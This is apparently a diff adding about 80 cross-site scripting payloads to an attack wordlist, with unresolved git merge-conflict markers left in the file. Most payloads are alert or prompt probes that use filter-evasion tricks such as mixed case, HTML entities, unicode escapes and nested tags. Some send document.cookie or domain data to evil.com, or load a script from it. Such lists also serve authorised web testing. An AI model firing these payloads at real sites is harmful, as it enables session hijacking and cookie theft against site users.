@@ -1,1 +1,85 @@
+<<<<<<< HEAD
+=======
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><img src=x onerror=prompt(1)>
+"><img src=x onerror=confirm(1)>
+"><svg onload=alert(1)>
+"><svg/onload=prompt(1)>
+"><iframe src="javascript:alert(1)"></iframe>
+"><body onload=alert(1)>
+"><input autofocus onfocus=alert(1)>
+"><details open ontoggle=alert(1)>
+"><script>confirm(document.cookie)</script>
+"><svg onload=confirm(1)>
+"><img src=x onerror=alert(document.domain)>
+"><iframe src="javascript:prompt(document.cookie)"></iframe>
+"><script>prompt(document.domain)</script>
+"><script src="https://evil.com/xss.js"></script>
+"><script>fetch('https://evil.com/'+document.cookie)</script>
+"><a href="javascript:alert(1)">Click Me</a>
+"><video onerror=alert(1)>
+"><script>while(1)alert('XSS')</script>
+"><img src=x onerror="alert(`Domain: ${document.domain}\nTitle: ${document.title}`)">
+"><img src=x onerror="console.log(`ReadyState: ${document.readyState}`)">
+"><svg onload="alert(document.URL)">
+"><svg onload="alert(`Referrer: ${document.referrer}`)">
+"><img src=x onerror="alert(`LastModified: ${document.lastModified}`)">
+"><script>alert(navigator.userAgent)</script>
+"><iframe src="javascript:alert(location.href)"></iframe>
+"><script>alert(location.protocol)</script>
+"><img src=x onerror="alert(document.characterSet)">
+"><script>alert(history.length)</script>
+"><script>alert(/XSS/.source)</script>
+"><img sRc=x oneRror=alert(1)>
+"><svg oNlOad=alert(1)>
+"><iframe srC="jAvAsCrIpT:alert(1)"></iframe>
+"><a href="jAvAsCrIpT:alert(1)">Click Me</a>
+"><scr<script>ipt>alert(1)</script>
+"><img src="x:`alert(1)`">
+"><svg onload=eval('alert(1)')>
+"><img src=x oneRror="eval('alert(1)')">
+"><sVg/onLoad=prompt(1)>
+"><img src=x onerror=&#97;lert(1)>
+"><svg onload=&#x61;lert(1)>
+"><iframe src=java&#x73;cript:alert(1)>
+"><script>al\u0065rt(1)</script>
+"><script>co\u006efirm(1)</script>
+"><img src=x onerror="ja&#x76;ascript:alert(1)">
+"><svg onload="prompt(&#x31;)">
+"><script>window </script>
+"><script>alert.call(null,1)</script>
+"><script>Function('alert(1)')()</script>
+"><img src=x onerror="confirm(document.domain)">
+"><script>alert(document.referrer)</script>
+"><svg onload="fetch(document.cookie)">
+"><script>location=`http://evil.com/${document.domain}`</script>
+"><script>alert(navigator.language)</script>
+"><svg onload="console.log(location.pathname)">
+"><img src=x onerror="confirm(location.hostname)">
+"><script>alert(screen.width+'x'+screen.height)</script>
+"><svg onload=prompt(navigator.platform)>
+"><img src=x onerror="confirm(navigator.vendor)">
+"><input autofocus onfocus=prompt(document.domain)>
+"><textarea autofocus onfocus=alert(1)>
+"><svg xmlns="http://www.w3.org/2000/svg" onload=alert(1)>
+"><object data="javascript:alert(1)"></object>
+"><embed src="javascript:alert(1)">
+"><math><mtext><script>alert(1)</script></mtext></math>
+"><script src="data:text/javascript,alert(1)"></script>
+"><iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+"><a href="data:text/html,<script>alert(1)</script>">Click Me</a>
+"><img src=x onerror="window.open('http://evil.com')">
+"><img src=x onerror="alert('------XSS------')">
+"><svg onload="confirm('------XSS------')">
+"><img src=x onerror="alert(document.cookie)">
+"><iframe src=javaScript:alert(location)>
+"><svg onload="prompt(location.search)">
+"><img src=x onerror="alert(location.hash)">
+"><script>alert(location.pathname)</script>
+"><img src=x onerror="console.log(location.origin)">
+"><svg onload="alert(screen.colorDepth)">
+"><script>prompt(navigator.appName)</script>
+><img src=x onerror=prompt(1)>
+>>>>>>> 8f4498b88e276e7f1b022e2f7ac7a20de69f4afd
 "><img src=x onerror="confirm(`------XSS By Ren-Xploit------\nSystem::\n- Domain: ${document.domain}\n- ReadyState: ${document.readyState}\n- InputEncoding: ${document.inputEncoding}\n- Title: ${document.title}\n- TextContent: ${document.textContent}\n- Protocol: ${location.protocol}\n- LastModified: ${document.lastModified}`)">
